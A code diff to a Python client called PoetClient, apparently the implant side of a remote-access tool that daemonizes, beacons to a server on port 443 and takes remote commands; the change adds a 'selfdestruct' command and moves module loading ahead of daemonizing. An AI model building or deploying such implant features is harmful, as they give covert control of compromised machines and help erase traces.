@@ -65,6 +65,13 @@ class PoetClient(object):
                 if inp == 'fin':
                     found = True
                     break
+                elif inp == 'selfdestruct':
+                    try:
+                        selfdestruct()
+                        self.s.send('boom')
+                        sys.exit()
+                    except Exception as e:
+                        self.s.send(str(e.message))
                 # elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                 #     s.send(self.execute(inp))
                 # elif inp == 'recon':
@@ -307,6 +314,11 @@ def main():
     global args
     args = get_args()
 
+    # dynamically load all modules. needs to be before daemonize because it
+    # needs to be able to open itself to find modindex.txt in package.c
+    # daemonize changes the cwd so the open won't work.
+    module.load_modules()
+
     # daemonize if we're not in --no-daemon or --debug mode
     if not args.no_daemon and not args.debug:
         daemonize()
@@ -327,9 +339,6 @@ def main():
     PORT = int(args.port) if args.port else 443
 
     debug.info(('Poet started with interval of {} seconds to port {}. Ctrl-c to exit').format(args.interval, PORT))
-
-    # dynamically load all modules
-    module.load_modules()
 
     try:
         while True:
